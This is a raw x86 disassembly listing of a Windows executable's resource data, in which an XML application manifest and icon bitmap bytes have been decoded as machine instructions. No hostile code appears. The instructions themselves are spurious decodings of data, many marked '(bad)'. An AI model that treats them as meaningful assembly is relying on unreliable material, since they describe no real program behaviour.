  408847:	or     eax,0x2020200a
  40884c:	and    BYTE PTR [esp+eiz*2],bh
  40884f:	gs jo  0x4088b7
  408852:	outs   dx,BYTE PTR ds:[esi]
  408853:	fs outs dx,BYTE PTR gs:[esi]
  408856:	je     0x408899
  408858:	jae    0x4088cd
  40885a:	gs ins DWORD PTR es:[edi],dx
  40885c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  408860:	or     eax,0x2020200a
  408865:	and    BYTE PTR [eax],ah
  408867:	and    BYTE PTR [eax],ah
  408869:	and    BYTE PTR [ecx+eiz*2],bh
  40886c:	jae    0x4088e1
  40886e:	gs ins DWORD PTR es:[edi],dx
  408870:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  408874:	fs outs dx,BYTE PTR gs:[esi]
  408877:	je     0x4088e2
  408879:	je     0x4088f4
  40887b:	or     eax,0x2020200a
  408880:	and    BYTE PTR [eax],ah
  408882:	and    BYTE PTR [eax],ah
  408884:	and    BYTE PTR [eax],ah
  408886:	and    BYTE PTR [eax],ah
  408888:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40888c:	gs cmp eax,0x6e697722
  408892:	xor    esi,DWORD PTR [edx]
  408894:	and    cl,BYTE PTR ds:0x2020200a
  40889a:	and    BYTE PTR [eax],ah
  40889c:	and    BYTE PTR [eax],ah
  40889e:	and    BYTE PTR [eax],ah
  4088a0:	and    BYTE PTR [eax],ah
  4088a2:	and    BYTE PTR [esi+0x61],ch
  4088a5:	ins    DWORD PTR es:[edi],dx
  4088a6:	gs cmp eax,0x63694d22
  4088ac:	jb     0x40891d
  4088ae:	jae    0x40891f
  4088b0:	data16 je 0x4088e1
  4088b3:	push   edi
  4088b4:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  4088bb:	inc    ebx
  4088bc:	outs   dx,DWORD PTR ds:[esi]
  4088bd:	ins    DWORD PTR es:[edi],dx
  4088be:	ins    DWORD PTR es:[edi],dx
  4088bf:	outs   dx,DWORD PTR ds:[esi]
  4088c0:	outs   dx,BYTE PTR ds:[esi]
  4088c1:	sub    eax,0x746e6f43
  4088c6:	jb     0x408937
  4088c8:	ins    BYTE PTR es:[edi],dx
  4088c9:	jae    0x4088ed
  4088cb:	or     eax,0x2020200a
  4088d0:	and    BYTE PTR [eax],ah
  4088d2:	and    BYTE PTR [eax],ah
  4088d4:	and    BYTE PTR [eax],ah
  4088d6:	and    BYTE PTR [eax],ah
  4088d8:	and    BYTE PTR [esi+0x65],dh
  4088db:	jb     0x408950
  4088dd:	imul   ebp,DWORD PTR [edi+0x6e],0x2e36223d
  4088e4:	xor    BYTE PTR [esi],ch
  4088e6:	xor    BYTE PTR [esi],ch
  4088e8:	xor    BYTE PTR [edx],ah
  4088ea:	or     eax,0x2020200a
  4088ef:	and    BYTE PTR [eax],ah
  4088f1:	and    BYTE PTR [eax],ah
  4088f3:	and    BYTE PTR [eax],ah
  4088f5:	and    BYTE PTR [eax],ah
  4088f7:	and    BYTE PTR [eax+0x75],dh
  4088fa:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  4088fe:	dec    ebx
  4088ff:	gs jns 0x408956
  408902:	outs   dx,DWORD PTR ds:[esi]
  408903:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  408907:	and    dh,BYTE PTR [esi]
  408909:	xor    eax,0x36623539
  40890e:	xor    al,0x31
  408910:	xor    al,0x34
  408912:	arpl   WORD PTR [ebx+0x66],sp
  408915:	xor    DWORD PTR [esi+eiz*2+0x22],esp
  408919:	or     eax,0x2020200a
  40891e:	and    BYTE PTR [eax],ah
  408920:	and    BYTE PTR [eax],ah
  408922:	and    BYTE PTR [eax],ah
  408924:	and    BYTE PTR [eax],ah
  408926:	and    BYTE PTR [ecx+eiz*2+0x6e],ch
  40892a:	addr16 jne 0x40898e
  40892d:	addr16 gs cmp eax,0xd222a22
  408934:	or     ah,BYTE PTR [eax]
  408936:	and    BYTE PTR [eax],ah
  408938:	and    BYTE PTR [eax],ah
  40893a:	and    BYTE PTR [eax],ah
  40893c:	and    BYTE PTR [eax],ah
  40893e:	and    BYTE PTR [eax],ah
  408940:	and    BYTE PTR [eax+0x72],dh
  408943:	outs   dx,DWORD PTR ds:[esi]
  408944:	arpl   WORD PTR [ebp+0x73],sp
  408947:	jae    0x4089b8
  408949:	jb     0x40898c
  40894b:	jb     0x4089b0
  40894d:	push   0x63657469
  408952:	je     0x4089c9
  408954:	jb     0x4089bb
  408956:	cmp    eax,0xd222a22
  40895b:	or     ah,BYTE PTR [eax]
  40895d:	and    BYTE PTR [eax],ah
  40895f:	and    BYTE PTR [eax],ah
  408961:	and    BYTE PTR [eax],ah
  408963:	and    BYTE PTR [edi],ch
  408965:	ds or  eax,0x2020200a
  40896b:	and    BYTE PTR [edi+ebp*1],bh
  40896e:	fs gs jo 0x4089d7
  408972:	outs   dx,BYTE PTR ds:[esi]
  408973:	fs outs dx,BYTE PTR gs:[esi]
  408976:	je     0x4089b9
  408978:	jae    0x4089ed
  40897a:	gs ins DWORD PTR es:[edi],dx
  40897c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  408980:	or     eax,0x642f3c0a
  408985:	gs jo  0x4089ed
  408988:	outs   dx,BYTE PTR ds:[esi]
  408989:	fs outs dx,BYTE PTR gs:[esi]
  40898c:	arpl   WORD PTR [ecx+0x3e],di
  40898f:	or     eax,0x72743c0a
  408994:	jne    0x408a09
  408996:	je     0x4089e1
  408998:	outs   dx,BYTE PTR ds:[esi]
  408999:	outs   dx,WORD PTR ds:[esi]
  40899b:	and    BYTE PTR [eax+0x6d],bh
  40899e:	ins    BYTE PTR es:[edi],dx
  40899f:	outs   dx,BYTE PTR ds:[esi]
  4089a0:	jae    0x4089df
  4089a2:	and    dh,BYTE PTR [ebp+0x72]
  4089a5:	outs   dx,BYTE PTR ds:[esi]
  4089a6:	cmp    dh,BYTE PTR [ebx+0x63]
  4089a9:	push   0x73616d65
  4089ae:	sub    eax,0x7263696d
  4089b3:	outs   dx,DWORD PTR ds:[esi]
  4089b4:	jae    0x408a25
  4089b6:	data16 je 0x4089e6
  4089b9:	arpl   WORD PTR [edi+0x6d],bp
  4089bc:	cmp    ah,BYTE PTR [ecx+0x73]
  4089bf:	ins    DWORD PTR es:[edi],dx
  4089c0:	cs jbe 0x4089f6
  4089c3:	and    bh,BYTE PTR [esi]
  4089c5:	or     eax,0x2020200a
  4089ca:	and    BYTE PTR [ebx+esi*2],bh
  4089cd:	arpl   WORD PTR gs:[ebp+0x72],si
  4089d1:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  4089d9:	and    BYTE PTR [eax],ah
  4089db:	and    BYTE PTR [eax],ah
  4089dd:	and    BYTE PTR [eax],ah
  4089df:	cmp    al,0x72
  4089e1:	gs jno 0x408a59
  4089e4:	gs jae 0x408a5b
  4089e7:	gs fs push eax
  4089ea:	jb     0x408a55
  4089ec:	jbe    0x408a57
  4089ee:	ins    BYTE PTR es:[edi],dx
  4089ef:	gs addr16 gs jae 0x408a32
  4089f4:	or     eax,0x2020200a
  4089f9:	and    BYTE PTR [eax],ah
  4089fb:	and    BYTE PTR [eax],ah
  4089fd:	and    BYTE PTR [eax],ah
  4089ff:	and    BYTE PTR [eax],ah
  408a01:	and    BYTE PTR [edx+esi*2],bh
  408a04:	gs jno 0x408a7c
  408a07:	gs jae 0x408a7e
  408a0a:	gs fs inc ebp
  408a0d:	js     0x408a74
  408a0f:	arpl   WORD PTR [ebp+0x74],si
  408a12:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  408a19:	ins    BYTE PTR es:[edi],dx
  408a1a:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  408a1e:	gs ins BYTE PTR es:[edi],dx
  408a20:	cmp    eax,0x49736122
  408a25:	outs   dx,BYTE PTR ds:[esi]
  408a26:	jbe    0x408a97
  408a28:	imul   esp,DWORD PTR [ebp+0x72],0x22
  408a2c:	and    BYTE PTR [ebp+0x69],dh
  408a2f:	inc    ecx
  408a30:	arpl   WORD PTR [ebx+0x65],sp
  408a33:	jae    0x408aa8
  408a35:	cmp    eax,0x6c616622
  408a3a:	jae    0x408aa1
  408a3c:	and    ch,BYTE PTR [edi]
  408a3e:	ds or  eax,0x2020200a
  408a44:	and    BYTE PTR [eax],ah
  408a46:	and    BYTE PTR [eax],ah
  408a48:	and    BYTE PTR [edi+ebp*1],bh
  408a4b:	jb     0x408ab2
  408a4d:	jno    0x408ac4
  408a4f:	gs jae 0x408ac6
  408a52:	gs fs push eax
  408a55:	jb     0x408ac0
  408a57:	jbe    0x408ac2
  408a59:	ins    BYTE PTR es:[edi],dx
  408a5a:	gs addr16 gs jae 0x408a9d
  408a5f:	or     eax,0x2020200a
  408a64:	and    BYTE PTR [edi+ebp*1],bh
  408a67:	jae    0x408ace
  408a69:	arpl   WORD PTR [ebp+0x72],si
  408a6c:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x2f3c0a0d
  408a74:	je     0x408ae8
  408a76:	jne    0x408aeb
  408a78:	je     0x408ac3
  408a7a:	outs   dx,BYTE PTR ds:[esi]
  408a7b:	outs   dx,WORD PTR ds:[esi]
  408a7d:	ds or  eax,0x73613c0a
  408a83:	ins    DWORD PTR es:[edi],dx
  408a84:	jbe    0x408ab9
  408a86:	cmp    ah,BYTE PTR [ecx+0x70]
  408a89:	jo     0x408af7
  408a8b:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  408a92:	ds or  eax,0x2020200a
  408a98:	and    BYTE PTR [ecx+eiz*2],bh
  408a9b:	jae    0x408b0a
  408a9d:	jbe    0x408ad2
  408a9f:	cmp    dh,BYTE PTR [edi+0x69]
  408aa2:	outs   dx,BYTE PTR ds:[esi]
  408aa3:	outs   dx,DWORD PTR fs:[esi]
  408aa5:	ja     0x408b1a
  408aa7:	push   ebx
  408aa8:	gs je  0x408b1f
  408aab:	imul   ebp,DWORD PTR [esi+0x67],0x6d782073
  408ab2:	ins    BYTE PTR es:[edi],dx
  408ab3:	outs   dx,BYTE PTR ds:[esi]
  408ab4:	jae    0x408af3
  408ab6:	and    ch,BYTE PTR [eax+0x74]
  408ab9:	je     0x408b2b
  408abb:	cmp    ch,BYTE PTR [edi]
  408abd:	das    
  408abe:	jae    0x408b23
  408ac0:	push   0x73616d65
  408ac5:	cs ins DWORD PTR es:[edi],dx
  408ac7:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  408ace:	je     0x408afe
  408ad0:	arpl   WORD PTR [edi+0x6d],bp
  408ad3:	das    
  408ad4:	push   ebx
  408ad5:	dec    ebp
  408ad6:	dec    ecx
  408ad7:	das    
  408ad8:	xor    dh,BYTE PTR [eax]
  408ada:	xor    BYTE PTR ds:0x6e69572f,dh
  408ae0:	outs   dx,DWORD PTR fs:[esi]
  408ae2:	ja     0x408b57
  408ae4:	push   ebx
  408ae5:	gs je  0x408b5c
  408ae8:	imul   ebp,DWORD PTR [esi+0x67],0x203e2273
  408aef:	or     eax,0x2020200a
  408af4:	and    BYTE PTR [eax],ah
  408af6:	and    BYTE PTR [eax],ah
  408af8:	and    BYTE PTR [esp+eiz*2],bh
  408afb:	jo     0x408b66
  408afd:	inc    ecx
  408afe:	ja     0x408b61
  408b00:	jb     0x408b67
  408b02:	ds je  0x408b77
  408b05:	jne    0x408b6c
  408b07:	cmp    al,0x2f
  408b09:	fs jo  0x408b75
  408b0c:	inc    ecx
  408b0d:	ja     0x408b70
  408b0f:	jb     0x408b76
  408b11:	and    BYTE PTR ds:0x2020200a,cl
  408b18:	and    BYTE PTR [edi+ebp*1],bh
  408b1b:	popa   
  408b1c:	jae    0x408b8b
  408b1e:	jbe    0x408b53
  408b20:	cmp    dh,BYTE PTR [edi+0x69]
  408b23:	outs   dx,BYTE PTR ds:[esi]
  408b24:	outs   dx,DWORD PTR fs:[esi]
  408b26:	ja     0x408b9b
  408b28:	push   ebx
  408b29:	gs je  0x408ba0
  408b2c:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  408b33:	cmp    al,0x2f
  408b35:	popa   
  408b36:	jae    0x408ba5
  408b38:	jbe    0x408b6d
  408b3a:	cmp    ah,BYTE PTR [ecx+0x70]
  408b3d:	jo     0x408bab
  408b3f:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  408b46:	ds or  eax,0x612f3c0a
  408b4c:	jae    0x408bc1
  408b4e:	gs ins DWORD PTR es:[edi],dx
  408b50:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  408b54:	or     eax,0x280a0d0a
  408b59:	add    BYTE PTR [eax],al
  408b5b:	add    BYTE PTR [eax],ah
  408b5d:	add    BYTE PTR [eax],al
  408b5f:	add    BYTE PTR [eax+0x0],al
  408b62:	add    BYTE PTR [eax],al
  408b64:	add    DWORD PTR [eax],eax
  408b66:	add    al,0x0
  408b68:	add    BYTE PTR [eax],al
  408b6a:	add    BYTE PTR [eax],al
  408b6c:	add    BYTE PTR [edx],al
	...
  408b86:	add    BYTE PTR [eax],0x0
  408b89:	add    BYTE PTR [eax],0x0
  408b8c:	add    BYTE PTR [eax+0x800080],al
  408b92:	add    BYTE PTR [eax],al
  408b94:	add    BYTE PTR [eax],0x80
  408b97:	add    BYTE PTR [eax-0x7fffff80],al
  408b9d:	add    BYTE PTR [eax-0x3f3f4000],0x0
  408ba4:	add    BYTE PTR [eax],al
  408ba6:	inc    DWORD PTR [eax]
  408ba8:	add    bh,bh
  408baa:	add    BYTE PTR [eax],al
  408bac:	add    bh,bh
  408bae:	inc    DWORD PTR [eax]
  408bb0:	inc    DWORD PTR [eax]
  408bb2:	add    BYTE PTR [eax],al
  408bb4:	inc    DWORD PTR [eax]
  408bb6:	inc    DWORD PTR [eax]
  408bb8:	(bad)  
  408bb9:	inc    DWORD PTR [eax]
  408bbb:	add    bh,bh
  408bbd:	(bad)  
  408bbe:	inc    DWORD PTR [eax]
	...
  408bec:	(bad)  
  408bee:	add    BYTE PTR [eax],al
  408bf0:	add    BYTE PTR [eax],al
  408bf2:	jo     0x408bf4
  408bf4:	jo     0x408bf6
  408bf6:	add    BYTE PTR [eax],al
  408bf8:	add    BYTE PTR [eax],al
  408bfa:	add    BYTE PTR [eax],al
  408bfc:	jo     0x408c02
  408c02:	pop    es
  408c03:	xchg   DWORD PTR [eax],eax
  408c05:	add    BYTE PTR [eax],al
  408c07:	add    BYTE PTR [eax],al
  408c09:	add    BYTE PTR [eax],al
  408c0b:	add    bh,bh
  408c0d:	add    BYTE PTR [eax],al
  408c0f:	add    BYTE PTR [eax],al
  408c11:	pop    es
  408c12:	(bad)  
  408c13:	inc    DWORD PTR [edi+0x0]
  408c19:	add    BYTE PTR [eax],al
  408c1b:	add    al,bh
  408c1d:	add    BYTE PTR [eax],al
  408c1f:	add    BYTE PTR [eax],al
  408c21:	js     0x408c22
  408c23:	(bad)  
  408c24:	clc    
  408c25:	jo     0x408c27
  408c27:	add    BYTE PTR [eax],al
  408c29:	add    BYTE PTR [eax],al
  408c2b:	(bad)  
  408c2d:	add    BYTE PTR [eax],al
  408c2f:	add    BYTE PTR [eax-0x71],dh
  408c32:	(bad)  
  408c33:	(bad)  
  408c34:	inc    DWORD PTR [eax+0xf0070]
  408c3a:	add    BYTE PTR [edi],cl
  408c3c:	add    BYTE PTR [eax],0x0
  408c3f:	add    BYTE PTR [edi],al
  408c41:	(bad)  
  408c42:	(bad)  
  408c43:	(bad)  
  408c44:	push   edi
  408c46:	add    BYTE PTR [eax],al
  408c48:	(bad)  
  408c4a:	add    bh,bh
  408c4c:	add    BYTE PTR [eax],al
  408c4e:	add    BYTE PTR [eax],al
  408c50:	or     bh,bh
  408c52:	(bad)  
  408c53:	(bad)  
  408c54:	(bad)  
  408c55:	clc    
  408c56:	add    BYTE PTR [eax],al
  408c58:	ud0    ecx,DWORD PTR [edi]
  408c5b:	inc    DWORD PTR [eax]
  408c5d:	add    BYTE PTR [eax],al
  408c5f:	add    BYTE PTR [edi],al
  408c61:	(bad)  
  408c62:	(bad)  
  408c63:	(bad)  
  408c64:	push   edi
  408c66:	add    BYTE PTR [eax],al
  408c68:	ud0    edi,edi
  408c6b:	push   DWORD PTR [eax+0x0]
  408c6e:	add    BYTE PTR [eax],al
  408c70:	jo     0x408c01
  408c72:	(bad)  
  408c73:	(bad)  
  408c74:	push   eax
  408c76:	jo     0x408c78
  408c78:	ud0    edi,edi
  408c7b:	(bad)  
  408c7c:	(bad)  
  408c7d:	inc    DWORD PTR [eax]
  408c7f:	add    BYTE PTR [eax],al
  408c81:	js     0x408c82
  408c83:	(bad)  
  408c84:	push   DWORD PTR [eax+0x0]
  408c87:	add    BYTE PTR [edi],cl
  408c89:	(bad)  
  408c8a:	(bad)  
  408c8b:	(bad)  
  408c8c:	push   eax
  408c8e:	add    BYTE PTR [eax],al
  408c90:	add    BYTE PTR [edi],al
  408c92:	(bad)  
  408c93:	push   edi
  408c95:	add    BYTE PTR [eax],al
  408c97:	add    BYTE PTR [edi],cl
  408c99:	(bad)  
  408c9a:	(bad)  
  408c9b:	(bad)  
  408c9c:	inc    DWORD PTR [eax]
  408c9e:	add    BYTE PTR [eax],al
  408ca0:	add    BYTE PTR [eax],al
  408ca2:	pop    es
  408ca3:	xchg   DWORD PTR [eax],eax
  408ca5:	add    BYTE PTR [eax],al
  408ca7:	add    BYTE PTR [edi],cl
  408ca9:	(bad)  
  408caa:	(bad)  
  408cab:	push   eax
	...
  408cb5:	add    BYTE PTR [eax],al
  408cb7:	add    BYTE PTR [edi],cl
  408cb9:	(bad)  
  408cba:	(bad)  
  408cbb:	inc    DWORD PTR [eax]
	...
  408cc5:	add    BYTE PTR [eax],al
  408cc7:	add    BYTE PTR [edi],cl
  408cc9:	(bad)  
  408cca:	push   eax
	...
  408cd8:	ud0    edi,edi
  408cdb:	add    BYTE PTR [eax],al
  408cdd:	add    BYTE PTR [eax],al
  408cdf:	add    BYTE PTR [eax],al
  408ce1:	add    BYTE PTR [eax+0x0],dh
  408ce4:	jo     0x408ce6
  408ce6:	add    BYTE PTR [edi+0xf],dh
  408ce9:	push   eax
  408ceb:	ja     0x408d64
  408ced:	ja     0x408d66
  408cef:	jo     0x408cf1
  408cf1:	add    BYTE PTR [edi],al
  408cf3:	xchg   DWORD PTR [eax],eax
  408cf5:	add    BYTE PTR [eax],al
  408cf7:	jg     0x408d08
  408cf9:	dec    DWORD PTR [edi]
  408cfb:	(bad)  
  408cfc:	(bad)  
  408cfd:	(bad)  
  408cfe:	push   DWORD PTR [eax+0x0]
  408d01:	pop    es
  408d02:	(bad)  
  408d03:	inc    DWORD PTR [edi+0xf7f0000]
  408d09:	lock mov BYTE PTR [eax+0x70888888],cl
  408d10:	add    BYTE PTR [eax-0x1],bh
  408d13:	(bad)  
  408d14:	clc    
  408d15:	jo     0x408d17
  408d17:	jg     0x408d28
  408d19:	or     BYTE PTR [eax-0x77777778],cl
  408d1f:	jo     0x408d91
  408d21:	(bad)  
  408d22:	clc    
  408d23:	push   0x7f7080ff
  408d28:	add    BYTE PTR [eax-0x77777778],cl
  408d2e:	mov    BYTE PTR [eax+0x7],dh
  408d31:	inc    DWORD PTR [esi+0xf78f26]
  408d37:	jg     0x408d41
  408d39:	mov    BYTE PTR [eax-0x77777778],cl
  408d3f:	jo     0x408d49
  408d41:	jmp    DWORD PTR [edx+0x72]
  408d44:	outs   dx,DWORD PTR ds:[esi]
  408d45:	clc    
  408d46:	add    BYTE PTR [edi-0x78],bh
  408d49:	mov    BYTE PTR [eax-0x77777778],cl
  408d4f:	jo     0x408d58
  408d51:	inc    DWORD PTR [esi+0xf78f26]
  408d57:	jg     0x408ce1
  408d59:	mov    BYTE PTR [eax-0x77777778],cl
  408d5f:	jo     0x408dd1
  408d61:	(bad)  
  408d62:	clc    
  408d63:	push   0x7f70f0ff
  408d68:	mov    BYTE PTR [eax-0x77777778],cl
  408d6e:	mov    BYTE PTR [eax+0x0],dh
  408d71:	js     0x408d72
  408d73:	(bad)  
  408d74:	push   DWORD PTR [eax+0x0]
  408d77:	jg     0x408d01
  408d79:	mov    BYTE PTR [eax-0x77777778],cl
  408d7f:	jo     0x408d81
  408d81:	pop    es
  408d82:	(bad)  
  408d83:	push   edi
  408d85:	add    BYTE PTR [eax],al
  408d87:	jg     0x408d11
  408d89:	mov    BYTE PTR [eax-0x77777778],cl
  408d8f:	jo     0x408d91
  408d91:	add    BYTE PTR [edi],al
  408d93:	xchg   DWORD PTR [eax],eax
  408d95:	add    BYTE PTR [eax],al
  408d97:	jg     0x408d98
  408d99:	(bad)  
  408d9a:	(bad)  
  408d9b:	(bad)  
  408d9c:	(bad)  
  408d9d:	(bad)  
  408d9e:	push   DWORD PTR [eax+0x0]
  408da1:	add    BYTE PTR [eax],al
  408da3:	add    BYTE PTR [eax],al
  408da5:	add    BYTE PTR [eax],al
  408da7:	ja     0x408e20
  408da9:	ja     0x408e22
  408dab:	ja     0x408e24
  408dad:	ja     0x408e26
  408daf:	jo     0x408db1
	...
  408dbd:	add    BYTE PTR [eax],al
  408dbf:	add    bh,bh
  408dc1:	(bad)  
  408dc2:	(bad)  
  408dc3:	(bad)  
  408dc4:	(bad)  
  408dc5:	(bad)  
  408dc6:	call   FWORD PTR [edi+0xfffffff]
  408dcc:	lock jg 0x408dce
  408dcf:	pavgb  mm7,QWORD PTR [edi]
  408dd2:	(bad)  
  408dd3:	pop    ds
  408dd4:	rcr    BYTE PTR [edi],0x7e
  408dd7:	pop    ds
  408dd8:	or     BYTE PTR [edi],0x3c
  408ddb:	aas    
  408ddc:	add    BYTE PTR [edi],al
  408dde:	sbb    al,0x3f
  408de0:	add    BYTE PTR [edi],al
  408de2:	or     BYTE PTR [edi+0x0],bh
  408de5:	pop    es
  408de6:	add    BYTE PTR [edi+0x0],bh
  408de9:	pop    es
  408dea:	add    BYTE PTR [ebx],al
  408dec:	add    BYTE PTR [edi],al
  408dee:	add    BYTE PTR [edi],al
  408df0:	or     BYTE PTR [edi],0x0
  408df3:	xadd   BYTE PTR [edi],bl
  408df6:	add    BYTE PTR [edi],bl
  408df8:	loopne 0x408e39
  408dfa:	add    BYTE PTR [edi],bh
  408dfc:	clc    
  408dfd:	inc    DWORD PTR [eax]
  408dff:	jg     0x408e00
  408e01:	inc    DWORD PTR [eax]
  408e03:	(bad)  
  408e04:	(bad)  
  408e05:	inc    DWORD PTR [ecx]
  408e07:	push   eax
  408e09:	jl     0x408e0b
  408e0b:	add    eax,esp
  408e0d:	cmp    al,0x0
  408e0f:	add    eax,eax
  408e11:	sbb    al,0x0
  408e13:	add    DWORD PTR [eax+0x1000c],eax
  408e19:	add    al,0x0
  408e1b:	add    DWORD PTR [eax],eax
  408e1d:	add    al,0x0
  408e1f:	add    DWORD PTR [eax],eax
  408e21:	add    al,0x0
  408e23:	add    DWORD PTR [eax],eax
  408e25:	add    al,0x0
  408e27:	add    DWORD PTR [eax],eax
  408e29:	add    al,0x0
  408e2b:	add    DWORD PTR [eax-0x3ffefff4],eax
  408e31:	sbb    al,0x0
  408e33:	add    eax,esp
  408e35:	cmp    al,0x0
  408e37:	add    eax,edi
  408e39:	cld    
  408e3a:	add    BYTE PTR [ecx],al
  408e3c:	(bad)  
  408e3d:	(bad)  
  408e3e:	(bad)  
  408e3f:	jmp    FWORD PTR [eax]
  408e41:	add    BYTE PTR [eax],al
  408e43:	add    BYTE PTR [eax],dl
  408e45:	add    BYTE PTR [eax],al
  408e47:	add    BYTE PTR [eax],ah
  408e49:	add    BYTE PTR [eax],al
  408e4b:	add    BYTE PTR [ecx],al
  408e4d:	add    BYTE PTR [eax+eax*1],al
  408e50:	add    BYTE PTR [eax],al
  408e52:	add    BYTE PTR [eax],al
  408e54:	add    BYTE PTR [eax],0x0
	...
  408e6b:	add    BYTE PTR [eax],al
  408e6d:	add    BYTE PTR [eax+0x800000],al
  408e73:	add    BYTE PTR [eax],al
  408e75:	add    BYTE PTR [eax+0x8000],0x0
  408e7c:	add    BYTE PTR [eax],0x80
  408e7f:	add    BYTE PTR [eax-0x7fffff80],al
  408e85:	add    BYTE PTR [eax-0x3f3f4000],0x0
  408e8c:	add    BYTE PTR [eax],al
  408e8e:	inc    DWORD PTR [eax]
  408e90:	add    bh,bh
  408e92:	add    BYTE PTR [eax],al
  408e94:	add    bh,bh
  408e96:	inc    DWORD PTR [eax]
  408e98:	inc    DWORD PTR [eax]
  408e9a:	add    BYTE PTR [eax],al
  408e9c:	inc    DWORD PTR [eax]
  408e9e:	inc    DWORD PTR [eax]
  408ea0:	(bad)  
  408ea1:	inc    DWORD PTR [eax]
  408ea3:	add    bh,bh
  408ea5:	(bad)  
  408ea6:	inc    DWORD PTR [eax]
	...
  408eb4:	add    BYTE PTR [eax],al
  408eb6:	inc    DWORD PTR [eax]
  408eb8:	add    bh,bh
  408eba:	lock add BYTE PTR [eax],al
  408ebd:	add    al,dh
  408ebf:	add    BYTE PTR [edi],cl
  408ec1:	(bad)  
  408ec2:	inc    DWORD PTR [eax]
  408ec4:	add    BYTE PTR [edi],cl
  408ec6:	lock add BYTE PTR [edi],cl
  408ec9:	(bad)  
  408eca:	inc    DWORD PTR [eax]
  408ecc:	ud0    eax,DWORD PTR [eax]
  408ecf:	add    BYTE PTR [edi],cl
  408ed1:	(bad)  
  408ed2:	inc    DWORD PTR [eax]
  408ed4:	ud0    esi,eax
  408ed7:	add    BYTE PTR [eax],al
  408ed9:	push   eax
  408edb:	add    BYTE PTR [edi],cl
  408edd:	push   eax
  408edf:	add    BYTE PTR [eax],al
  408ee1:	add    BYTE PTR [eax],al
  408ee3:	add    BYTE PTR [edi],cl
  408ee5:	inc    DWORD PTR [eax]
  408ee7:	add    BYTE PTR [eax],al
  408ee9:	add    BYTE PTR [eax],al
  408eeb:	add    BYTE PTR [edi],cl
  408eed:	lock add BYTE PTR [eax],al
  408ef0:	add    BYTE PTR [eax],al
  408ef2:	add    BYTE PTR [eax],al
  408ef4:	sldt   WORD PTR [eax]
  408ef7:	add    BYTE PTR [eax],al
  408ef9:	push   eax
  408efb:	add    BYTE PTR [eax],al
  408efd:	ja     0x408f76
  408eff:	jo     0x408f10
  408f01:	or     BYTE PTR [edi-0x7777f800],0x70
  408f08:	(bad)  
  408f0a:	das    
  408f0b:	add    BYTE PTR [eax-0x78],bh
  408f0e:	mov    BYTE PTR [eax+0xf],dh
  408f11:	or     BYTE PTR [edi-0x77778800],0x70
  408f18:	add    bh,bh
  408f1a:	lock add BYTE PTR [edi+0x77],dh
  408f1e:	ja     0x408f90
	...
  408f28:	push   ebx
  408f2a:	add    BYTE PTR [eax],al
  408f2c:	(bad)  
  408f2d:	loope  0x408f2f
  408f2f:	add    BYTE PTR [ebx+0x1000063],al
  408f35:	add    eax,DWORD PTR [eax]
  408f37:	add    BYTE PTR [ecx],al
  408f39:	pop    es
  408f3a:	add    BYTE PTR [eax],al
  408f3c:	add    DWORD PTR [ecx],eax
  408f3e:	add    BYTE PTR [eax],al
  408f40:	add    DWORD PTR [ebx],0x0
  408f43:	add    bh,al
  408f45:	pop    es
  408f46:	add    BYTE PTR [eax],al
  408f48:	dec    DWORD PTR [edi]
  408f4a:	add    BYTE PTR [eax],al
  408f4c:	(bad)  
  408f4d:	pop    ds
  408f4e:	add    BYTE PTR [eax],al
  408f50:	add    DWORD PTR [ecx],0x0
  408f53:	add    BYTE PTR [ecx],al
  408f55:	add    DWORD PTR [eax],eax
  408f57:	add    BYTE PTR [ecx],al
  408f59:	add    DWORD PTR [eax],eax
  408f5b:	add    BYTE PTR [ecx],al
  408f5d:	add    DWORD PTR [eax],eax
  408f5f:	add    BYTE PTR [ebx-0x38ffffff],al
  408f65:	inc    DWORD PTR [eax]
  408f67:	add    BYTE PTR [eax],ch
  408f69:	add    BYTE PTR [eax],al
  408f6b:	add    BYTE PTR [eax],dh
  408f6d:	add    BYTE PTR [eax],al
  408f6f:	add    BYTE PTR [eax+0x0],ah
  408f72:	add    BYTE PTR [eax],al
  408f74:	add    DWORD PTR [eax],eax
  408f76:	or     BYTE PTR [eax],al
  408f78:	add    BYTE PTR [eax],al
  408f7a:	add    BYTE PTR [eax],al
  408f7c:	add    BYTE PTR [ecx],cl
	...
  408f86:	add    BYTE PTR [eax],al
  408f88:	add    BYTE PTR [ecx],al
  408f8a:	add    BYTE PTR [eax],al
  408f8c:	add    BYTE PTR [ecx],al
  408f8e:	add    BYTE PTR [eax],al
  408f90:	adc    DWORD PTR [edi+0x25],0x0
  408f94:	lock repnz xacquire add BYTE PTR [edx-0x70ffdb97],ah
  408f9d:	bound  esi,QWORD PTR [eax]
  408f9f:	add    BYTE PTR [ecx-0x2b],dl
  408fa2:	push   ebp
  408fa3:	add    ch,ah
  408fa5:	jmp    0x64da9093
  408faa:	and    al,0x0
  408fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fad:	jo     0x408fdf
  408faf:	add    dl,ah
  408fb1:	in     al,0xe2
  408fb3:	add    BYTE PTR [esi-0x6effc397],cl
  408fb9:	ins    DWORD PTR es:[edi],dx
  408fba:	inc    edx
  408fbb:	add    bl,bh
  408fbd:	sti    
  408fbe:	sti    
  408fbf:	add    al,ch
  408fc1:	in     al,dx
  408fc2:	jmp    0x408fc4
  408fc4:	clc    
  408fc5:	clc    
  408fc6:	stc    
  408fc7:	add    ah,dh
  408fc9:	cmc    
  408fca:	test   BYTE PTR [eax],0xf7
  408fcd:	clc    
  408fce:	stc    
  408fcf:	add    BYTE PTR [esi-0x3effc69a],cl
  408fd5:	loop   0x408f99
  408fd7:	add    cl,ah
  408fd9:	int    0xbd
  408fdb:	add    BYTE PTR [edi-0x13ff8264],dh
  408fe1:	out    dx,al
  408fe2:	out    dx,eax
